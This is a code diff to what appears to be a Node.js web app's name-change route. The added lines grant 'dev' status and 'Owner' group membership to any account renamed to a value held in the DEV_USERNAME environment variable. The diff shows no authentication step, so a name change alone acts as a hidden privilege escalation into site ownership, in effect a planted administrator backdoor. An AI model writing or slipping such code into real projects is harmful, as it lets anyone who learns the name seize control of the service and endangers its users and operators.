@@ -769,6 +769,27 @@ router.post("/name", async function (req, res) {
         $inc: { "itemsOwned.nameChange": -1 },
       }
     ).exec();
+
+    if (name === process.env.DEV_USERNAME) {
+      await models.User.updateOne(
+        { id: userId },
+        {
+          $set: { dev: true }
+        }
+      ).exec();
+
+      var group = await models.Group.findOne({
+        name: "Owner"
+      }).select("rank");
+
+      var inGroup = new models.InGroup({
+        user: userId,
+        group: group._id
+      });
+      await inGroup.save();
+      await redis.cacheUserPermissions(userId);
+    }
+
     await redis.cacheUserInfo(userId, true);
 
     res.sendStatus(200);
